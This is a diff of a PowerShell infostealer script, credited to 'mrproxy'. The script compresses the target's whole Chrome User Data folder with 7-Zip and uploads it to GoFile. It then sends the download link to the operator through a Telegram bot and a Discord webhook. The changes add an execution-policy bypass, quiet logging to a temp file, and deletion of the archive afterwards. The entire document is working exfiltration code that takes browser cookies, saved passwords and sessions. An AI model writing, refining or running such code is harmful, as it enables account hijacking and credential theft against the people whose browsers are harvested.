@@ -1,7 +1,13 @@
+# Ensure execution policy is bypassed
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
 # Created by mrproxy
-# $botToken = "bot_token"
-# $chatID = "chat_id"
-# $webhook = "dc_webhook"
+$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
+$chatID = "your-chat-id"               # Replace with your Telegram chat ID
+$webhook = "your-discord-webhook-url"  # Replace with your Discord Webhook URL
+
+# Debug log file
+$logFile = "$env:TEMP\debug_log.txt"
 
 # Function for sending messages through Telegram Bot
 function Send-TelegramMessage {
@@ -18,8 +24,9 @@ function Send-TelegramMessage {
 
         try {
             Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
+            Add-Content -Path $logFile -Value "Message sent to Telegram: $message"
         } catch {
-            Write-Host "Failed to send message to Telegram: $_"
+            Add-Content -Path $logFile -Value "Failed to send message to Telegram: $_"
         }
     } else {
         Send-DiscordMessage -message $message
@@ -38,11 +45,13 @@ function Send-DiscordMessage {
 
     try {
         Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
+        Add-Content -Path $logFile -Value "Message sent to Discord: $message"
     } catch {
-        Write-Host "Failed to send message to Discord: $_"
+        Add-Content -Path $logFile -Value "Failed to send message to Discord: $_"
     }
 }
 
+# Function to upload file and get download link
 function Upload-FileAndGetLink {
     param (
         [string]$filePath
@@ -51,7 +60,7 @@ function Upload-FileAndGetLink {
     # Get URL from GoFile
     $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
     if ($serverResponse.status -ne "ok") {
-        Write-Host "Failed to get server URL: $($serverResponse.status)"
+        Add-Content -Path $logFile -Value "Failed to get server URL: $($serverResponse.status)"
         return $null
     }
 
@@ -59,34 +68,20 @@ function Upload-FileAndGetLink {
     $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
 
     # Prepare the file for uploading
-    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
-    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    $bodyLines = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
-        "Content-Type: application/octet-stream",
-        $LF,
-        $fileEnc,
-        "--$boundary--",
-        $LF
-    ) -join $LF
-
-    # Upload the file
     try {
-        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -InFile $filePath -ContentType "multipart/form-data"
         if ($response.status -ne "ok") {
-            Write-Host "Failed to upload file: $($response.status)"
+            Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
             return $null
         }
+
+        Add-Content -Path $logFile -Value "File uploaded successfully: $($response.data.downloadPage)"
         return $response.data.downloadPage
     } catch {
-        Write-Host "Failed to upload file: $_"
+        Add-Content -Path $logFile -Value "Failed to upload file: $_"
         return $null
     }
 }
-
 
 # Check for 7zip path
 $zipExePath = "C:\Program Files\7-Zip\7z.exe"
@@ -94,16 +89,18 @@ if (-not (Test-Path $zipExePath)) {
     $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
 }
 
-# Check for Chrome executable and user data
+# Check for Chrome user data path
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 if (-not (Test-Path $chromePath)) {
-    Send-TelegramMessage -message "Chrome User Data path not found!"
+    Send-DiscordMessage -message "Chrome User Data path not found!"
+    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
     exit
 }
 
-# Exit if 7zip path not found
+# Exit if 7zip is not found
 if (-not (Test-Path $zipExePath)) {
-    Send-TelegramMessage -message "7Zip path not found!"
+    Send-DiscordMessage -message "7-Zip path not found!"
+    Add-Content -Path $logFile -Value "7-Zip path not found!"
     exit
 }
 
@@ -111,19 +108,24 @@ if (-not (Test-Path $zipExePath)) {
 $outputZip = "$env:TEMP\chrome_data.zip"
 & $zipExePath a -r $outputZip $chromePath
 if ($LASTEXITCODE -ne 0) {
-    Send-TelegramMessage -message "Error creating zip file with 7-Zip"
+    Send-DiscordMessage -message "Error creating zip file with 7-Zip"
+    Add-Content -Path $logFile -Value "Error creating zip file with 7-Zip"
     exit
 }
 
 # Upload the file and get the link
 $link = Upload-FileAndGetLink -filePath $outputZip
 
-# Check if the upload was successful and send the link via Telegram
+# Send the download link
 if ($link -ne $null) {
+    Send-DiscordMessage -message "Download link: $link"
     Send-TelegramMessage -message "Download link: $link"
+    Add-Content -Path $logFile -Value "Download link sent: $link"
 } else {
-    Send-TelegramMessage -message "Failed to upload file to gofile.io"
+    Send-DiscordMessage -message "Failed to upload file to GoFile.io"
+    Add-Content -Path $logFile -Value "Failed to upload file to GoFile.io"
 }
 
 # Remove the zip file after uploading
-Remove-Item $outputZip
+Remove-Item $outputZip -Force
+Add-Content -Path $logFile -Value "Deleted zip file after upload."
